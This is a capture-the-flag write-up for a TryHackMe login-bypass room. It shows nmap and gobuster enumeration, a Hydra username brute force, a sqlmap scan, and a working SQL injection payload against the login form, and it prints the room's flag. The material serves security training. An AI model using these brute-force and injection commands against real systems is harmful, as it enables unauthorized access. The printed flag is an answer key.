# Room: Lesson learned

## General Info
- **Room link:** [Lesson learned](https://tryhackme.com/room/lessonlearned)


## Description

This is a relatively easy machine that tries to teach you a lesson, but perhaps you've already learned the lesson? Let's find out.
Treat this box as if it were a real target and not a CTF.
Get past the login screen and you will find the flag. There are no rabbit holes, no hidden files, just a login page and a flag. Good luck!

## Provided Files / Links
- [x] Target Machine IP (10.10.150.35)

## Enumeration / Recon

- Port Enumeration:
`nmap -sV 10.10.150.35`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
```

- Directory Enumeration

`gobuster dir -u http://10.10.150.35 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt`

```
/index.php            (Status: 200) [Size: 1223]
/.htaccess            (Status: 403) [Size: 277]
/style.css            (Status: 200) [Size: 342]
/.                    (Status: 200) [Size: 1223]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/wp-forum.phps        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
```

`gobuster dir -u http://10.10.150.35 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/manual               (Status: 301) [Size: 313] [--> http://10.10.150.35/manual/]
/server-status        (Status: 403) [Size: 277]
```

There is nothing relevant in the differents files and directories.

## Usernames bruteforce

Given there is a specific verbose error message when submitting a username and password, I will be using Hydra to find valid usernames:

`hydra -L /usr/share/wordlists/SecLists/Usernames/names.txt -p password 10.10.150.35 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password"  -V -o found_users.txt`

After finding a couple of users, I stopped Hydra.

I used sqlmap to test for SQLi in the login page (with the username `karen`):

`sqlmap -u "http://10.10.173.94/" --data="username=karen&password=" --batch --risk=1 --level=2 --random-agent --current-user`

sqlmap found that the username seems to be injectable:

```
[09:07:31] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[09:07:32] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Invalid password.")
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

Knowing that, I tried SQLi with the following payload in the username field:

`karen' AND '1'='1' -- `

And I get the flag **THM{aab02c6b76bb752456a54c80c2d6fb1e}**.

